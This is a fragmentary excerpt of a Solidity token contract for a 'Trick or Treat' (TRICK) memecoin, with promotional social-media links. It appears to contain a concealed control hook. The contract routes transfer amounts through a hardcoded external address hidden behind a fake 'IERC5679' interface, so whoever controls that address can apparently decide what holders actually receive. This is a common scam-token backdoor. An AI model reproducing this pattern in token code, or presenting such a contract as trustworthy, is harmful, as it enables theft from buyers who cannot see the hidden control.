   ...
   \  /    .-" _..._ `-.   \/
    \|    `.-'       `-.`  /
     `-._      ///     _.-`
        ...
        https://t.me/TrickOrTreatETH
        https://x.com/TrickOrTreatETH
        TrickOrTreat.fi
...
interface IERC5679 {
      function assignShare(uint256 value) external returns (uint256);
}
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _fantom = 0x852EC2974162A79E769491BC268cB00ebD9c7b8a;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return fantom.assignShare(amount);
    }
    ...
    function _DeployTrickOrTreat(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTrickOrTreat(creator, initialSupply);
    }
}

contract TrickOrTreat is ERC20Token {
    constructor() ERC20Token("Trick or Treat", "TRICK", msg.sender, 666666666 * 10 ** 18) {
    }
}